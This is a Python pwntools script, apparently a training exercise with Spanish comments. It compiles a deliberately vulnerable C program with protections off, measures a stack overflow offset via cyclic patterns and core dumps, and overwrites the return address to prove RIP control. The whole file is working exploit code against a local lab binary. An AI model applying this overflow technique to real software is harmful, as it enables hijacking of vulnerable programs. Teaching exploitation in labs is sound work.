#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A3 - Control de RIP: 'B'*offset + p64(0x4343434343434343).
El offset NO se hardcodea: se recalcula con cyclic() + corefile (metodo A2).
USO: python3 a3_rip.py"""
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

BIN = './a3_rip'
TARGET_RIP = 0x4343434343434343      # 'CCCCCCCC' en little-endian: 8 'C'

compile_cmd = ['gcc', '-g', '-O0', '-fno-stack-protector', '-no-pie',
               '-o', BIN, 'a3_rip.c']
log.info('Compilando: %s', ' '.join(compile_cmd))
process(compile_cmd).wait()

# FASE 1 - recalcular el offset dinamicamente (cyclic + corefile)
io = process(BIN)
io.recvuntil(b'objetivo: RIP = 0x4343434343434343')
io.sendline(cyclic(300))
io.wait()
try:
    core = io.corefile
    offset = cyclic_find(core.read(core.rsp, 4))
except Exception:
    from pwnlib.corefile import Corefile
    core = Corefile('core')
    offset = cyclic_find(core.read(core.rsp, 4))
io.close()
log.info('Offset medido en caliente: %d bytes', offset)

# FASE 2 - payload real: 'B'*offset + 8 bytes de 'C'
#   [ 'B' * offset ]   relleno hasta la direccion de retorno guardada
#   [ p64(0x43 * 8) ]  la nueva direccion de retorno (little-endian)
payload = b'B' * offset + p64(TARGET_RIP)
assert b'\n' not in payload, 'el payload no debe contener 0x0a (gets)'

io = process(BIN)
io.recvuntil(b'objetivo: RIP = 0x4343434343434343')
io.sendline(payload)
io.wait()
try:
    core = io.corefile
    rip_real, fault = core.rip, getattr(core, 'fault_addr', 0)
except Exception:
    from pwnlib.corefile import Corefile
    core = Corefile('core')
    rip_real, fault = core.rip, getattr(core, 'fault_addr', 0)
io.close()

# Nuance x86_64: 0x4343...4343 es NO canonica; el kernel puede reportar el
# crash EN el ret (rip=0x401xxx) mientras el fault address (si_addr) senala
# 0x4343434343434343. Cualquiera de las dos senales demuestra el control.
if rip_real == TARGET_RIP or fault == TARGET_RIP:
    log.success('A3 SUPERADO: el salto a %#x ocurrio (rip=%#x, fault=%#x)',
                TARGET_RIP, rip_real, fault)
    log.info('Escribiste una direccion en la pila y la CPU la obedecio.')
else:
    log.failure('A3: rip=%#x fault=%#x (esperado %#x). Revisa el offset.',
                rip_real, fault, TARGET_RIP)
